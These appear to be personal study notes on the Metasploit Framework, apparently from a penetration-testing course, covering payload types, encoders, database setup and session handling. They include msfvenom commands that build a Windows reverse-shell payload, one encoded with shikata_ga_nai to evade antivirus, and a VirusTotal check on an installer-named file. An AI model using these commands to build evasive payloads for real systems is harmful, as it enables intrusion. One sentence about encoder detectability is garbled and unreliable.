# Using the Metasploit Framework
- [MSF Components](#msf-components)
    - [Payloads](#payloads)
    - [Encoders](#encoders)
    - [Databases](#databases)
    - [Sessions](#sessions)
## MSF Components
### Payloads
- There are three different types of payload modules in the Metasploit Framework: Singles, Stagers, and Stages.

- Whether or not a payload is staged is represented by `/` in the payload name . For example, `windows/shell_bind_tcp` is a single payload with no stage, whereas `windows/shell/bind_tcp` consists of a stager (bind_tcp) and a stage (shell).

1. Singles
    - A Single payload contains the exploit and the entire shellcode for the selected task. Inline payloads are by design more stable than their counterparts because they contain everything all-in-one.
    - Singles are self-contained payloads.

2. Stagers
    - Stager payloads work with Stage payloads to perform a specific task. 
    - A Stager is waiting on the attacker machine, ready to establish a connection to the victim host once the stage completes its run on the remote host.

3. Stages
    - Stages are payload components that are downloaded by stager's modules. 
    - The various payload Stages provide advanced features with no size limits, such as Meterpreter, VNC Injection, and others. 

- The Meterpreter payload is a specific type of multi-faceted payload that uses DLL injection to ensure the connection to the victim host is stable, hard to detect by simple checks, and persistent across reboots or system changes.


### Encoders

- Encoders assist with making payloads compatible with different processor architectures while at the same time help with antivirus evasion. 
- The use of encoders strictly for AV evasion has diminished over time, as IPS/IDS manufacturers have improved how their protection software deals with signatures in malware and viruses.

- Shikata Ga Nai (SGN) is one of the most utilized Encoding schemes today because it is so hard to detect that payloads encoded through its mechanism are not universally undetectable anymore.

- Generating Payload - Without Encoding (using msfvenom): `msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl`
- Generating Payload - With Encoding: `msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl -e x86/shikata_ga_nai`

> [!TIP]
> We can put `-i 10` to multiple iterations of the same Encoding scheme.


- We can `msf-virustotal` to analyze our payloads: `msf-virustotal -k <API key> -f TeamViewerInstall.exe`


### Databases

- Databases in msfconsole are used to keep track of your results.
- Msfconsole has built-in support for the PostgreSQL database system.
- **Setting up the Database**
    1. We must ensure that the PostgreSQL server is up and running on our host machine: `sudo service postgresql status`
    2. Start PostgreSQL: `sudo systemctl start postgresql`
    3. MSF - Initiate a Database: `sudo msfdb init`
    - Recheck the status of the database: `sudo msfdb status`
    4. MSF - Connect to the Initiated Database: `sudo msfdb run`

> [!NOTE]
> If, however, we already have the database configured and are not able to change the password to the MSF username, proceed with these commands:
> ```
> abdeonix@htb[/htb]$ msfdb reinit
> abdeonix@htb[/htb]$ cp /usr/share/metasploit-framework/config/database.yml ~/.msf4/
> abdeonix@htb[/htb]$ sudo service postgresql restart
> abdeonix@htb[/htb]$ msfconsole -q
> 
> msf6 > db_status
> 
> [*] Connected to msf. Connection type: PostgreSQL.
> ```


### Sessions
- MSFconsole can manage multiple modules at the same time.
- **Using Sessions**:
    - Listing Active Sessions: We can use the `sessions` command to view our currently active sessions.
    - Interacting with a Session: `sessions -i 1`

- **Jobs**
    - We would need to use the jobs command to look at the currently active tasks running in the background and terminate the old ones to free up the port.
    - Running an Exploit as a Background Job: `exploit -j`
    - Use `jobs -l` to list all running jobs. 